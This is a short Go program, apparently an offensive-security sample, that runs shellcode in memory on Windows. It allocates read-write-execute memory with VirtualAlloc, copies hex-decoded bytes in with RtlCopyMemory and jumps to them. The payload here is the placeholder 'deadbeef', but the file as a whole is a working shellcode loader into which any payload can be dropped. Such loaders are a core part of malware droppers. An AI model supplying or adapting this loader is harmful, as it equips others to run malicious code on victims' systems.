//--------------------------------------------------------------
// Author: KrknSec
// Description: Example of local shellcode execution in Golang
//--------------------------------------------------------------

package main

import (
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
)

func main() {

	data, err := hex.DecodeString("deadbeef")

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println(err.Error())
	}

	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	if err != nil {
		fmt.Println(err.Error())
	}

	_, _, err = syscall.SyscallN(addr, 0, 0, 0, 0)
	if err != nil {
		fmt.Println(err.Error())
	}

}
